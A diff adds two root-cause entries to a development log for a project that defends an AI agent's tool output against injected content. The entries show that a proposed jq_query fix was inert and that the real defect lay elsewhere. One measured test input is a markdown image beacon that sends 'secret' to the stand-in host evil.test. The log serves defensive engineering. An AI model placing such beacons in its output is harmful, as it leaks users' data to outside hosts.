@@ -346,3 +346,82 @@ _(superseded by the line above; retained as filed)_ **Class:** `missing-validati
   *Tests* states the same rule for deny-lists, and it binds sweeps identically.
   A practical test: ask whether the query could match an instance nobody has seen
   yet. If it can only match code shaped like the example, it is not a sweep.
+
+### RC-7 — The recommended fix was inert, and the todo that carried it had been reviewed by three agents
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`
+
+**Class:** K-3 — *class-id:* `stale-observation`
+
+- **The plan said:** todo 001's recommended remedy, written up in three
+  numbered options with option 1 marked "the recommendation": call `defendText`
+  from `jq_query` passing `contentType: "application/json"`, "so the sniffer
+  stays off but the markdown/beacon stages still run."
+- **Reality was:** that call runs **no** strip stage at all. In `defendText`,
+  `application/json` makes `supportsMarkupComments` false, `isMarkdownContentType`
+  false and `isSniffableContentType` false — the last one deliberately, so
+  `looksLikeMarkupShape` never mangles a JSON string field. `needsStripPath` is
+  therefore false and Steps 3–5 are skipped entirely. Measured before writing
+  anything: `defendText('{"d":"see ![x](https://evil.test/?d=secret) end"}',
+  { contentType: "application/json" })` returns its input byte-identical. The
+  proposed fix and the defect it was written against produce the same bytes.
+- **What changed:** nothing was implemented from that option. The audit was
+  taken back to the director with the measurement, and the scope was re-cut
+  around what the code actually does — see RC-8 for the substantive half.
+- **What this costs next time:** **a remedy written into a todo is an untested
+  hypothesis, and reads exactly like a conclusion.** This one survived being
+  filed by one reviewer, cited by a second, and carried through three review
+  rounds and a merge, because at no point did anyone have a reason to run it —
+  the todo's job was to defer the work, and deferring is what everybody did.
+  The specific trap is that the sentence *"pass X so that Y still happens"* is
+  two claims wearing one clause: the first is a code change and the second is a
+  prediction about a function nobody re-read. Audit the *remedy* against HEAD
+  with the same suspicion as the plan's premises — `docs/compound/`'s Step 2
+  says "does the plan match reality", and a proposed fix is part of the plan.
+  It cost four minutes to check and would have cost a shipped no-op.
+
+### RC-8 — The instance was mis-scoped: the asymmetry was JSON-vs-everything, not jq_query-vs-curl_execute
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`
+
+**Class:** K-4, K-11 — *class-id:* `unescaped-sink`
+
+- **The plan said:** `jq_query` takes "a shorter defence path than `defendText`",
+  and its failure scenario compared the beacon it returns against the same
+  content "returned through `curl_execute` on a markdown response", which is
+  replaced with `[image removed]`. Severity P1, with an acceptance criterion
+  requiring a regression test that the beacon **is stripped**.
+- **Reality was:** `jq_query` cannot return non-JSON. `applyJqFilter` parses its
+  input with `JSON.parse` and throws otherwise, then returns
+  `JSON.stringify(...)`. And `defendText` on a JSON document *is*
+  sanitise-and-detect — the markup and markdown stages are excluded for JSON,
+  deliberately. So `jq_query` was already doing what `defendText` would have
+  done, and the like-for-like comparison is `curl_execute --jq_filter` on the
+  same file, which strips nothing either. The chosen comparator — a *markdown*
+  response — was the one content type that made the gap appear.
+
+  The genuine gap was the sibling instance the todo listed second and rated
+  "more serious": `post-processor.ts::processTextPart`, where the wrap is the
+  only defence for `registerCustomTool()` returns, `beforeRequest`
+  short-circuits and YAML endpoint results.
+- **What changed:** the wrap now calls `defendText` with
+  `contentTypeUndetermined: true` and `decodeEntities: false`. A module-private
+  `DEFENDED` symbol, set by `markDefended()` and claimed only by `curl_execute`'s
+  and `jq_query`'s SUCCESS returns, stops that from double-processing text
+  already defended under a real Content-Type. `jq_query` now calls
+  `defendText(contentType: JSON_MIME)` instead of reproducing its JSON arm, with
+  no behaviour change. **The strip-inside-JSON half was declined, not deferred** —
+  the exclusion is one decision applying identically to three call sites, it
+  governs bytes `save_to_file` persists and `jq_query` reads back, and closing it
+  is a different argument from the one the todo made. Pinned by tests in
+  `jq-query.test.ts` naming this RC, so a later round reads the decision rather
+  than re-opening it.
+- **What this costs next time:** **a comparator is part of a finding's evidence,
+  and picking the one that shows the gap is how a mis-scope survives review.**
+  The todo compared a JSON-only tool against a markdown response; against the
+  JSON response it can actually be given, the difference is zero. Before filing
+  "X is weaker than Y", state the input X actually accepts and re-run the
+  comparison on that. The second cost is smaller and sharper: **the instance a
+  finding is *named* after is not always the one that matters.** This todo's
+  title, id and P1 rating all pointed at `jq_query`; the live defect was in the
+  paragraph underneath, and it stayed open for the round that fixed the title.
